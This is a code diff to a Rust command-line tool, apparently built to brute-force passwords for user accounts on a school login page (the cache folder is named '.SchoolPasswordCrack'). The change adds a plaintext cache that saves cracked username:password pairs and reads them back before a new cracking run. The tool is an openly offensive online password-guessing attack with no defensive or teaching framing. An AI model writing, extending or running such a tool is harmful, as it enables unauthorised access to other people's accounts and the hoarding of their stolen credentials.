@@ -1,5 +1,8 @@
 // STD modules
+use std::fs::OpenOptions;
+use std::io::Read;
 use std::io::Write;
+use std::path::Path;
 use std::sync::mpsc;
 use std::thread;
 use std::time;
@@ -7,6 +10,7 @@ use std::time::Instant;
 use std::time::SystemTime;
 
 // External Crates
+use home::home_dir;
 use regex::Regex;
 use ureq::Agent;
 
@@ -25,21 +29,23 @@ pub fn command() -> Command {
     Command::new(
         "crack",
         "Crack A password",
-        "crack <username> [-t Threads] [-p Prefix] [--page BasePage]",
+        "crack <username> [-t Threads] [-p Prefix] [-nc No Cache] [--cache Cache Path] [--page BasePage]",
         |args| {
             if args.len() <= 2 {
                 color_print!(Color::Red, "[*] Not enough args supplied");
                 return;
             }
 
+            let default_cache = home_dir().unwrap().join(Path::new(".SchoolPasswordCrack/cache"));
+
             // Parse the args
             let threads: &u32 = &arg_parse::get_arg_value(&args, "-t")
                 .unwrap_or("16")
                 .parse::<u32>()
                 .unwrap();
-
             let prefix: &str = &arg_parse::get_arg_value(&args, "-p").unwrap_or("30");
-
+            let no_cache: bool = arg_parse::get_arg_value(&args, "-nc").is_some();
+            let cache_path: &str = &arg_parse::get_arg_value(&args, "--cache").unwrap_or(default_cache.to_str().unwrap());
             let base_page: &str = &arg_parse::get_arg_value(&args, "--page").unwrap_or(BASE_PAGE);
 
             // Get Username
@@ -65,6 +71,11 @@ pub fn command() -> Command {
                 );
             }
 
+            let cache = match no_cache {
+                true => None,
+                false => Some(cache_path),
+            };
+
             color_print!(
                 Color::Green,
                 "\n[*] Starting Crack on {}",
@@ -73,11 +84,44 @@ pub fn command() -> Command {
 
             color_print!(Color::Magenta, "[i] Prefix: {}", &prefix);
             color_print!(Color::Magenta, "[i] Threads: {}", &threads.to_string());
+            color_print!(Color::Magenta, "[i] Cache: {}", &cache.unwrap_or("None"));
             color_print!(Color::Magenta, "[i] Base Page: {}", &base_page);
             println!();
 
+            // Check if we have a cache of the username and if so, use it
+            if cache.is_some() && Path::new(cache.unwrap()).exists() {
+                let mut file = OpenOptions::new()
+                    .read(true)
+                    .open(cache.unwrap())
+                    .unwrap();
+
+                let mut data = String::new();
+                file.read_to_string(&mut data).unwrap();
+
+                for line in data.split("\n") {
+                    if line.is_empty() {
+                        continue;
+                    }
+
+                    let mut entry = line.split(":");
+                    let user = entry.next().unwrap();
+                    let pass = entry.next().unwrap();
+
+                    if username == user {
+                        print!(
+                            "\r{} {} {}",
+                            color::color("[+] Password found:", Color::Green),
+                            color::color(pass, Color::Blue),
+                            color::color("[CACHE]", Color::Red)
+                        );
+                        return;
+                    }
+                }
+                return;
+            }
+
             // C R A C K
-            crack(&username, *threads as u32, base_page, prefix);
+            crack(&username, *threads as u32, base_page, prefix, cache);
         },
     )
 }
@@ -205,7 +249,7 @@ enum Message {
     End,
 }
 
-pub fn crack(username: &str, threads: u32, base_url: &str, raw_prefix: &str) {
+pub fn crack(username: &str, threads: u32, base_url: &str, raw_prefix: &str, cache: Option<&str>) {
     // Start Timer
     let start_time = SystemTime::now();
 
@@ -272,6 +316,9 @@ pub fn crack(username: &str, threads: u32, base_url: &str, raw_prefix: &str) {
                         color::color(&password, Color::Blue)
                     );
                     unsafe { RUNNING = false }
+                    if let Some(cache) = cache {
+                        cache_password(cache, username, &password);
+                    }
                     break 'main;
                 }
                 Message::NotFound => tried += 1,
@@ -313,4 +360,23 @@ pub fn crack(username: &str, threads: u32, base_url: &str, raw_prefix: &str) {
         "\n[*] All Done - Took {}s",
         &start_time.elapsed().unwrap().as_secs().to_string()
     );
+}
+
+/// Save found password to cache
+fn cache_password(cache: &str, username: &str, password: &str) {
+    // Make folder
+    std::fs::create_dir_all(Path::new(cache).parent().unwrap()).unwrap();
+
+    // Open file
+    let mut file = OpenOptions::new()
+        .write(true)
+        .create(true)
+        .append(true)
+        .open(cache)
+        .unwrap();
+
+    // Write to file
+    if let Err(e) = writeln!(file, "{}:{}", username, password) {
+        eprintln!("Error writing to cache... {}", e);
+    }
 }
